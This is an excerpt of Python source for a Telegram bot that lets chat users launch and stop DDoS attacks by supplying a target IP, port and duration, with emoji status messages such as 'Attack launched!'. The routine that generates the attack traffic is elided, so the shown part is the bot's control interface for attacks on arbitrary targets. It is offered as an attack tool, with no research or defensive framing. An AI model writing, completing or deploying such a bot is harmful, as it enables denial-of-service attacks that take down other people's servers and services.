...
def start_ddos(message):
    """
    Starts a DDOS attack based on user input.
    """
    chat_id = message.chat.id
    if bot.attack_in_progress:
        bot.send_message(chat_id, "*⚠️ An attack is already in progress!*\n"
                                   "*Please stop the current attack first before starting a new one.*",
                         parse_mode='Markdown')
        return

    bot.send_message(chat_id, "*💣 Ready to start a DDOS attack?*\n"
                               "*Provide the target IP, port, and duration in seconds.*\n"
                               "*Example: 192.168.1.1 8080 60*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_ddos_start)


def process_ddos_start(message):
    """
    Handles the input for starting the DDOS attack.
    """
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Invalid format!*\n"
                                               "*Please provide the inputs as IP, port, and duration.*\n"
                                               "*Example: 192.168.1.1 8080 60*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
        if bot.attack_in_progress:
            bot.send_message(message.chat.id, "*⚠️ An attack is already in progress!*\n"
                                               "*Please wait or stop the current attack first.*",
                             parse_mode='Markdown')
            return
        ...
        bot.send_message(message.chat.id, f"*🚀 Attack launched!*\n\n"
                                           ...
                                           "*Use /stop_ddos to cancel the attack if needed.*", parse_mode='Markdown')

    except Exception as e:
        bot.attack_in_progress = False
        bot.send_message(message.chat.id, f"*❗ Error starting the attack:* {e}", parse_mode='Markdown')


@bot.message_handler(commands=['stop_ddos'])
def stop_ddos(message):
    """
    Stops an ongoing DDOS attack.
    """
    chat_id = message.chat.id
    if not bot.attack_in_progress:
        bot.send_message(chat_id, "*❌ No attack is currently in progress.*\n"
                                   "*Use /start_ddos to begin a new attack.*", parse_mode='Markdown')
        return
    ...
    # If you have a way to terminate the attack process, you can include it here.
    # For example, killing a subprocess or sending a stop signal to the attack method.

    bot.send_message(chat_id, "*🛑 The current DDOS attack has been stopped!*\n"
                               "*You can now launch another attack using /start_ddos.*", parse_mode='Markdown')
